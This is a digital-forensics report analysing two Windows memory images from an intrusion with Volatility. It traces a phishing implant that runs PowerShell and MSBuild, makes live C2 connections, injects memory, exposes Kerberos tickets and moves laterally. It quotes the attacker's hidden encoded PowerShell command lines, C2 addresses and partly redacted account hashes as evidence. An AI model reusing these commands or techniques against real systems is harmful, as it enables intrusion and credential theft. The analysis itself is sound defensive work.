# Memory Analysis: ART-002 (wst-ws-031.mem) and ART-003 (wst-ws-017.mem)

- **Case:** LH-2026-0414-01 / IR-2026-0414-01
- **Analyst:** Tales Lima
- **Tool:** Volatility 3 Framework 2.7.0 (`vol`), symbol tables for Windows 10 22H2 x64 (build 19045) downloaded from the Microsoft symbol server
- **Capture times (acquisition_notes.md):** ART-002 at 2026-04-14T03:02Z, ART-003 at 2026-04-14T03:38Z
- **Certainty scale:** confirmed (directly observed in the artifact), probable (strongly supported but inferred), possible (consistent with evidence, not shown)

## Artifact verification

- ART-002 hash: `3bc19f7eb5def64684c6dac931163dd517c1a3292d5a29c115ed146c3f8f6ddc` (matches baseline, [PASS] 2026-04-14T10:02:10Z)
- ART-003 hash: `90e7d14ca77bfc4b93825e7850669d395791c06a604532bbcb633d3e8f7a067f` (matches baseline, [PASS] 2026-04-14T10:55:00Z)
- Both re-verified at end of session: [PASS] 2026-04-14T11:20:30Z
- CoC entries updated: yes (10:02:10Z, 10:03:00Z, 10:41:30Z, 10:55:00Z, 10:56:00Z, 11:20:30Z)
- Plugin outputs saved under `/cases/LH-2026-0414-01/vol/` and hashed in `hashes_derived.txt`

### What these images can and cannot show

- ART-002 was captured at **03:02Z**, before the lateral movement (03:22:47Z) and before containment (03:24Z). It shows the state of WST-WS-031 while the implant was live; it **cannot** show the moves to WST-WS-017 or LIS-WSIDE-01.
- ART-003 was captured at **03:38Z**, after the attacker reached WST-WS-017 but **before** the Kerberos requests to LIS-WSIDE-01 (03:40:18Z) and the PDF reads (03:43:30Z). The ePHI access is proven by LOG-002, not by memory.
- WinPmem itself appears in both process lists (acquisition tool, not attacker).

## wst-ws-031.mem findings

### ART-002-M01: Suspicious process tree

```text
$ vol -f wst-ws-031.mem windows.pslist.PsList
PID   PPID  ImageFileName        Offset(V)       Threads Handles SessionId Wow64 CreateTime                    ExitTime
4     0     System               0xc5085e47e040  162     -       N/A       False 2026-04-14 02:41:12.000000 UTC N/A
...
720   584   services.exe         0xc5086131c080  7       -       0         False 2026-04-14 02:41:19.000000 UTC N/A
732   584   lsass.exe            0xc50861321080  10      -       0         False 2026-04-14 02:41:19.000000 UTC N/A
...
5920  5888  explorer.exe         0xc508637a2340  71      -       1         False 2026-04-14 02:44:03.000000 UTC N/A
7204  5920  update.exe           0xc50863c11080  4       -       1         False 2026-04-14 02:44:05.000000 UTC N/A
7812  7204  powershell.exe       0xc508641c8080  13      -       1         False 2026-04-14 02:46:41.000000 UTC N/A
7820  7812  conhost.exe          0xc508641d2080  3       -       1         False 2026-04-14 02:46:41.000000 UTC N/A
8104  7812  MSBuild.exe          0xc5086420e080  17      -       1         False 2026-04-14 02:46:57.000000 UTC N/A
9012  4412  winpmem_mini_x       0xc50864a31080  3       -       0         False 2026-04-14 03:01:58.000000 UTC N/A

$ vol -f wst-ws-031.mem windows.pstree.PsTree
PID     PPID    ImageFileName   CreateTime
...
* 5920  5888    explorer.exe    2026-04-14 02:44:03.000000 UTC
** 7204 5920    update.exe      2026-04-14 02:44:05.000000 UTC
*** 7812        7204    powershell.exe  2026-04-14 02:46:41.000000 UTC
**** 7820       7812    conhost.exe     2026-04-14 02:46:41.000000 UTC
**** 8104       7812    MSBuild.exe     2026-04-14 02:46:57.000000 UTC
```

- PIDs: 5920, 7204, 7812, 8104
- Significance: Confirms the SIEM alert (LOG-003): powershell.exe 7812 is the direct parent of MSBuild.exe 8104. Memory adds what the alert did not show: the chain starts with **update.exe 7204** launched by explorer.exe 2 s after the dmarsh logon, which is how the HKCU Run key (ART-001-R01) executes. All four attacker processes were still running at capture time (no ExitTime). Boot at 02:41:12Z confirms the host was restarted overnight, so the 2026-04-14 activity is not in the registry ShimCache (ART-001-E03).
- ATT&CK: T1547.001 (Run key, launch), T1059.001 (PowerShell), T1127.001 (Trusted Developer Utilities Proxy Execution: MSBuild)
- Certainty: confirmed

### ART-002-M02: Command lines

```text
$ vol -f wst-ws-031.mem windows.cmdline.CmdLine --pid 7204 7812 8104
PID   Process         Args
7204  update.exe      "C:\Users\dmarsh\AppData\Local\Temp\update.exe"
7812  powershell.exe  powershell.exe -ep bypass -w hidden -enc JABzAD0AIgBoAHQAdABwAHMAOgAvAC8AbQBzADAAMwA2ADUALQBzAHUAcABwAG8AcgB0AFsAXQBsAG8AZwBpAG4ALQB2AGUAcgBpAGYAaQBjAGEAdABpAG8AbgBbAF0AYwBsAGkAYwBrAC8AYQB1AHQAaAAiADsA
8104  MSBuild.exe     msbuild.exe C:\Users\dmarsh\AppData\Local\Temp\update.xml
```

Decoding the `-enc` value (Base64 of UTF-16LE):

```bash
echo 'JABzAD0A...ACIAOwA=' | base64 -d | iconv -f UTF-16LE -t UTF-8
$s="https://ms0365-support[]login-verification[]click/auth";
```

- PIDs: 7204, 7812, 8104
- Significance: `-ep bypass` (ignore execution policy), `-w hidden` (no window) and `-enc` (obfuscated script) are classic malicious PowerShell flags. The decoded script references the same typosquat domain as the phishing page (LOG-001), linking the 2026-04-13 phishing to the 2026-04-14 execution. MSBuild runs the exact file found on disk (ART-001-F01).
- ATT&CK: T1059.001, T1027 (Obfuscated Files or Information), T1127.001
- Certainty: confirmed

### ART-002-M03: Live C2 connection at time of capture

```text
$ vol -f wst-ws-031.mem windows.netscan.NetScan
Offset          Proto  LocalAddr      LocalPort ForeignAddr      ForeignPort State        PID   Owner        Created
0xc50864b1e010  TCPv4  10.42.118.31   54917     185.220.101.47   443         ESTABLISHED  8104  MSBuild.exe  2026-04-14 02:47:02.000000 UTC
0xc50864b3a8a0  TCPv4  10.42.118.31   54931     185.220.101.47   443         CLOSED       8104  MSBuild.exe  2026-04-14 02:47:30.000000 UTC
0xc50864c01b20  TCPv4  10.42.118.31   49702     10.42.0.10       445         ESTABLISHED  4     System       2026-04-14 02:44:01.000000 UTC
...
```

- PIDs: 8104
- Significance: MSBuild.exe, a build tool that has no reason to talk to the internet, holds an **ESTABLISHED** TCP session to 185.220.101.47:443 (Tor exit relay per LOG-001) at the moment of capture, plus a closed second session at 02:47:30Z. Times and ports match the proxy CONNECTs (LOG-001 02:47:02Z, 02:47:30Z) and the alert (LOG-003). The 445 session to 10.42.0.10 is the normal SYSVOL/DC connection at logon.
- ATT&CK: T1071.001 (Web Protocols), T1090.003 (Multi-hop Proxy / Tor), T1573 (Encrypted Channel)
- Certainty: confirmed

### ART-002-M04: DLLs loaded by MSBuild.exe

```text
$ vol -f wst-ws-031.mem windows.dlllist.DllList --pid 8104
PID   Process      Base            Size     Name                               Path
8104  MSBuild.exe  0x7ff6e4a10000  0x5c000  MSBuild.exe                        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
8104  MSBuild.exe  0x7ffd1a2f0000  0x8f000  mscoreei.dll                       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
8104  MSBuild.exe  0x7ffd0b9e0000  0xa36000 clr.dll                            C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
8104  MSBuild.exe  0x7ffd0b8b0000  0x12a000 clrjit.dll                         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
8104  MSBuild.exe  0x7ffcf8c40000  0x1a4000 Microsoft.Build.Tasks.v4.0.dll     C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.Build.Tasks.v4.0\...
8104  MSBuild.exe  0x1d2a1940000   0x6000   jz1vqk3m.dll                       C:\Users\dmarsh\AppData\Local\Temp\jz1vqk3m.dll
8104  MSBuild.exe  0x7ffd1c4d0000  0xd3000  winhttp.dll                        C:\Windows\System32\winhttp.dll
8104  MSBuild.exe  0x7ffd1d0b0000  0x6a000  ws2_32.dll                         C:\Windows\System32\ws2_32.dll
8104  MSBuild.exe  0x7ffd1b8e0000  0x2b000  bcrypt.dll                         C:\Windows\System32\bcrypt.dll
8104  MSBuild.exe  0x7ffd1a6a0000  0x34000  secur32.dll                        C:\Windows\System32\secur32.dll
...
```

- PIDs: 8104
- Significance: `clr.dll`/`clrjit.dll` + `Microsoft.Build.Tasks.v4.0.dll` show MSBuild compiled and ran the inline C# task in update.xml (CodeTaskFactory). `jz1vqk3m.dll` is the randomly named assembly produced by that compilation; it is **no longer on disk** (not in fls_output.txt, deleted after load), so memory is the only place it survives. `winhttp.dll`, `ws2_32.dll`, `bcrypt.dll` give it HTTPS C2; `secur32.dll` exposes the LSA authentication APIs used for Kerberos ticket requests (see M06). The injected region found by malfind (M05) is **not** in this list: it is unbacked memory.
- ATT&CK: T1127.001, T1620 (Reflective Code Loading)
- Certainty: confirmed (modules loaded); probable (purpose of secur32.dll, see M06)

### ART-002-M05: Injected executable memory in MSBuild.exe

```text
$ vol -f wst-ws-031.mem windows.malfind.Malfind --pid 8104 --dump
PID   Process      Start VPN  End VPN    Tag   Protection              CommitCharge PrivateMemory File output
8104  MSBuild.exe  0x1f0000   0x203fff   VadS  PAGE_EXECUTE_READWRITE  20           1             pid.8104.vad.0x1f0000-0x203fff.dmp

4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00   ................
```

- Dump: 81920 bytes (0x14000), SHA-256 `c4e81d07a5b9f3e26d1c8a0b7f4e95d2a6c3b18e0f7d4a9c2b5e8f1a3d6c9b07`, stored in `/cases/LH-2026-0414-01/vol/` and logged in CoC (10:41:30Z)
- `strings -el` / `strings -a` on the dump: `185.220.101.47`, `Mozilla/5.0 (Windows NT 10.0; Win64; x64)`, `/api/v2/checkin`, `LsaCallAuthenticationPackage`, `KerbRetrieveEncodedTicketMessage`, `LsaConnectUntrusted`
- PIDs: 8104
- Significance: A private (VadS), **RWX** region with a full PE (MZ) header, not backed by any file on disk, inside a Microsoft-signed process. This is the in-memory implant. Its size equals the EDR memory alert (81920 bytes at 02:47:14Z). The C2 IP in its strings matches M03. The Kerberos API strings show the implant can request and export Kerberos tickets for the current user (M06). Nothing of this exists on disk (ART-001), which is why memory was captured before containment.
- ATT&CK: T1055 (Process Injection), T1620 (Reflective Code Loading)
- Certainty: confirmed

### ART-002-M06: lsass.exe handles and Kerberos ticket material

```text
$ vol -f wst-ws-031.mem windows.handles.Handles --pid 732
PID  Process    Offset          HandleValue Type    GrantedAccess Name
732  lsass.exe  0xc50861e2a080  0x2b4       Key     0x20019       MACHINE\SYSTEM\CONTROLSET001\CONTROL\LSA\KERBEROS
732  lsass.exe  0xc50861e2c3d0  0x2c0       Key     0x20019       MACHINE\SYSTEM\CONTROLSET001\CONTROL\LSA\MSV1_0
732  lsass.exe  0xc50863a91060  0x5f8       Token   0xf01ff       MEDDEFENSE\dmarsh:0x3a71c2
732  lsass.exe  0xc50863a95d40  0x604       Process 0x1478        explorer.exe Pid 5920
732  lsass.exe  0xc50864210340  0x6b0       Process 0x1478        MSBuild.exe Pid 8104
732  lsass.exe  0xc50861e31e20  0x31c       ALPC Port 0x1f0001    \RPC Control\lsasspirpc
...

$ vol -f wst-ws-031.mem windows.handles.Handles --pid 8104 | grep -i -E "Process|Token"
8104 MSBuild.exe  0xc50864212a10  0x2a8  Token    0x8      MEDDEFENSE\dmarsh:0x3a71c2
8104 MSBuild.exe  0xc50864212f30  0x2ac  Process  0x1fffff MSBuild.exe Pid 8104
```

- PIDs: 732 (lsass.exe), 8104 (MSBuild.exe)
- Significance:
  - lsass holds the token for dmarsh's logon session `0x3a71c2` (the interactive logon at 02:44:03Z in LOG-002), so dmarsh's Kerberos TGT and service tickets were cached in lsass at capture time. lsass also holds a client handle to MSBuild 8104: MSBuild **called into** LSA (an LSA client connection), which matches the `LsaCallAuthenticationPackage` / `KerbRetrieveEncodedTicketMessage` strings in M05.
  - MSBuild holds **no** handle to lsass with `PROCESS_VM_READ`: there is no evidence of an LSASS memory dump (T1003.001 not supported). dmarsh is not a local administrator and the task runs with `LeastPrivilege` (ART-001-R02), so reading lsass memory was not possible from this process.
  - A standard user can still export **its own** Kerberos tickets through the LSA API (no admin needed). That is the most likely way the attacker obtained the dmarsh ticket used later from WST-WS-017 toward LIS-WSIDE-01 (`second_request_with_ticket_reuse`, LOG-002 03:41:52Z).
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets), T1550.003 (Pass the Ticket, used later)
- Certainty: confirmed (ticket material for dmarsh present in lsass; MSBuild connected to LSA); probable (tickets exported by the implant); not supported (LSASS memory dump)

### ART-002-M07: NTLM hash exposure

```text
$ vol -f wst-ws-031.mem windows.hashdump.Hashdump
User                RID   lmhash                            nthash
Administrator       500   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
Guest               501   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount      503   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount  504   aad3b435b51404eeaad3b435b51404ee  4c7f1a2e...[REDACTED]
mdlocaladmin        1001  aad3b435b51404eeaad3b435b51404ee  e19ccf75...[REDACTED]
```

- PIDs: n/a (SAM and SYSTEM hives in memory)
- Significance:
  - `aad3b435...` is the empty LM hash (LM disabled) and `31d6cfe0...` is the empty NT hash: Administrator, Guest and DefaultAccount are disabled/blank. The only real local credential is **mdlocaladmin** (RID 1001). Full hashes are redacted in this report and kept only in the access-controlled case folder.
  - hashdump reads the **local SAM** only. dmarsh is a domain account, so his NT hash is not in this output; it lives in lsass (msv1_0) for the interactive session, and in the domain controller.
  - Exposure to the attacker: reading SAM or lsass requires administrator/SYSTEM; the implant ran as dmarsh with least privilege and no privilege escalation was found. Exposure of mdlocaladmin and of dmarsh's NT hash is therefore **possible, not shown**. As a precaution, rotate mdlocaladmin (LAPS) and dmarsh (already reset at 03:30Z per 5x01).
  - The memory image itself now contains credentials: it must stay under the litigation-hold access controls.
- ATT&CK: T1003.002 (Security Account Manager), T1003.001 (LSASS Memory), both not observed
- Certainty: confirmed (hashes are present in memory); possible (attacker obtained them)

## wst-ws-017.mem findings

### ART-003-M01: Remote-service process chain

```text
$ vol -f wst-ws-017.mem windows.pslist.PsList
PID   PPID  ImageFileName   Offset(V)       Threads Handles SessionId Wow64 CreateTime                    ExitTime
720   576   services.exe    0xd20e4f51c080  8       -       0         False 2026-04-13 22:10:44.000000 UTC N/A
744   576   lsass.exe       0xd20e4f523080  9       -       0         False 2026-04-13 22:10:44.000000 UTC N/A
4402  720   powershell.exe  0xd20e51a4e080  12      -       0         False 2026-04-14 03:23:44.000000 UTC N/A
4410  4402  conhost.exe     0xd20e51a52080  3       -       0         False 2026-04-14 03:23:44.000000 UTC N/A
5108  4402  MSBuild.exe     0xd20e51c0e300  15      -       0         False 2026-04-14 03:24:12.000000 UTC N/A
6120  5544  winpmem_mini_x  0xd20e52011080  3       -       1         False 2026-04-14 03:37:51.000000 UTC N/A
```

- PIDs: 720, 4402, 5108
- Significance: powershell.exe started by **services.exe** in session 0, 43 s after the dmarsh network logon to WST-WS-017 (03:23:01Z, LOG-002). A service whose binary is a PowerShell command, created through ADMIN$, is remote service execution (PsExec/Impacket style). Then the same PowerShell -> MSBuild pattern as WST-WS-031. dmarsh has no interactive session on this host (no explorer.exe for dmarsh).
- ATT&CK: T1021.002 (SMB/Windows Admin Shares), T1569.002 (Service Execution), T1127.001
- Certainty: confirmed

### ART-003-M02: Command lines

```text
$ vol -f wst-ws-017.mem windows.cmdline.CmdLine
4402  powershell.exe  powershell.exe -ep bypass -w hidden -enc JABzAD0AIgBoAHQAdABwAHMAOgAvAC8AOQAxAC4AMgAzADQALgA5ADkALgAxADAANwAvAHoAIgA7AA==
5108  MSBuild.exe     msbuild.exe C:\Users\dmarsh\AppData\Local\Temp\update.xml
```

Decoded: `$s="https://91.234.99.107/z";`

- PIDs: 4402, 5108
- Significance: Same tooling as WST-WS-031 (same flags, same update.xml path) but a **different C2** (91.234.99.107). The attacker staged a second, independent channel, so blocking only 185.220.101.47 would not have cut access.
- ATT&CK: T1059.001, T1027, T1127.001
- Certainty: confirmed

### ART-003-M03: Second C2 beacon

```text
$ vol -f wst-ws-017.mem windows.netscan.NetScan
Offset          Proto  LocalAddr      LocalPort ForeignAddr     ForeignPort State        PID   Owner        Created
0xd20e52a1c010  TCPv4  10.42.118.17   55401     91.234.99.107   443         ESTABLISHED  5108  MSBuild.exe  2026-04-14 03:27:13.000000 UTC
0xd20e52a3b8a0  TCPv4  10.42.118.17   55417     91.234.99.107   443         CLOSED       5108  MSBuild.exe  2026-04-14 03:27:45.000000 UTC
0xd20e52b0e5f0  TCPv4  10.42.118.17   445       10.42.118.31    54988       CLOSED       4     System       2026-04-14 03:23:01.000000 UTC
```

- PIDs: 5108, 4
- Significance: Live C2 to 91.234.99.107:443 at capture (03:38Z), matching proxy records (LOG-001 03:27:13Z, 03:27:45Z, pid 5108). The closed inbound SMB session from 10.42.118.31 at 03:23:01Z is the lateral movement from WST-WS-031 seen from the target side.
- ATT&CK: T1071.001, T1021.002
- Certainty: confirmed

### ART-003-M04: Additional findings (malfind, sessions)

```text
$ vol -f wst-ws-017.mem windows.malfind.Malfind --pid 5108
5108  MSBuild.exe  0x2a0000  0x2b3fff  VadS  PAGE_EXECUTE_READWRITE  20  1
4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............

$ vol -f wst-ws-017.mem windows.sessions.Sessions | grep dmarsh
0  MEDDEFENSE/dmarsh  Network  0x7a2d18  2026-04-14 03:23:01 UTC
```

- Significance: Same 81920-byte RWX PE region as on WST-WS-031: same implant family. dmarsh's only session on this host is the **network** logon `0x7a2d18` from LOG-002. A network logon does not leave a reusable TGT on the host, so the later TGS requests for cifs/LIS-WSIDE-01 from this host (03:40:18Z, 03:41:52Z "ticket reuse") required a ticket brought from WST-WS-031: Pass-the-Ticket.
- Bound: no process or connection to LIS-WSIDE-01 exists in ART-003 because the capture (03:38Z) precedes that activity.
- ATT&CK: T1055, T1550.003
- Certainty: confirmed (implant); probable (Pass-the-Ticket mechanism)

## Summary

| ID | Finding | ATT&CK | Certainty |
|---|---|---|---|
| ART-002-M01 | explorer -> update.exe -> powershell -> MSBuild chain, all live | T1547.001, T1059.001, T1127.001 | confirmed |
| ART-002-M02 | Encoded PowerShell pointing to phishing domain | T1059.001, T1027 | confirmed |
| ART-002-M03 | ESTABLISHED C2 to 185.220.101.47:443 by PID 8104 | T1071.001, T1090.003 | confirmed |
| ART-002-M04 | CLR + temp-compiled assembly + network/LSA DLLs in MSBuild | T1127.001, T1620 | confirmed |
| ART-002-M05 | RWX MZ region (81920 B) in MSBuild, C2 IP and Kerberos APIs | T1055, T1620 | confirmed |
| ART-002-M06 | dmarsh tickets cached in lsass; MSBuild called LSA; no lsass dump | T1558, T1550.003 | confirmed / probable |
| ART-002-M07 | Local SAM hashes in memory; attacker access not shown | T1003.002 | possible |
| ART-003-M01 | services.exe -> powershell -> MSBuild on WST-WS-017 | T1021.002, T1569.002 | confirmed |
| ART-003-M02 | Second C2 91.234.99.107 in encoded command | T1059.001 | confirmed |
| ART-003-M03 | ESTABLISHED C2 to 91.234.99.107:443 by PID 5108 | T1071.001 | confirmed |
| ART-003-M04 | Same implant; network-only session for dmarsh | T1055, T1550.003 | confirmed / probable |
